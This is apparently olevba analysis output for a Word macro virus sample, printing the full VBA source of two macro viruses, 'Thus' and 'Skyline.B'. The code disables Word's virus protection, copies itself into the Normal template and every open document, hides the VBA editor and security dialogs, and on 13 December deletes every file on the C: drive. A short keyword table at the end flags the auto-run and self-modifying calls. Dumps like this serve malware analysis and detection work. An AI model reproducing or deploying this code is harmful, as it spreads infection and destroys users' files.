olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-5dfda136e2d5a0b901fea076e645ddebef143a48
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-5dfda136e2d5a0b901fea076e645ddebef143a48 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If (Day(Now()) = 13) And (Month(Now()) = 12) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.*"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For i = 1 To .FoundFiles.Count
        Kill .FoundFiles(i)
        Next i
        End If
    End With
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub































'
'
'


































-------------------------------------------------------------------------------
VBA MACRO Skyline.bas 
in file: Virus.MSWord.Thus-based-5dfda136e2d5a0b901fea076e645ddebef143a48 - OLE stream: 'Macros/VBA/Skyline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Name - W97M/Skyline.B
'Author - [Bench]
Dim DeleteMe As Boolean
Sub AutoOpen()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If Application.ShowVisualBasicEditor = True Then _
    Application.ShowVisualBasicEditor = False
Call BenchCore
End Sub
Sub ViewVBCode()
On Error Resume Next
DeleteMe = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Skyline MV"
    .Text = "You thought you got rid of me, but I'm Still here, better and stronger!"
    .Animation = msoAnimationGreeting
    .Show
End With
Call BenchCore
'Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next
DeleteMe = True
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsCustomize()
On Error Resume Next
DeleteMe = True
End Sub
Sub ViewSecurity()
On Error Resume Next
MsgBox "Access is Restricted!", vbCritical, "Microsoft Word"
End Sub
Sub BenchCore()
On Error Resume Next
ModulName = "Skyline"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
Set Carrier = NormalTemplate.VBProject.VBComponents
Set host = ActiveDocument.VBProject.VBComponents
Else
Set Carrier = ActiveDocument.VBProject.VBComponents
Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
Carrier(ModulName).Export "c:\ascii.vxd"
host.import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

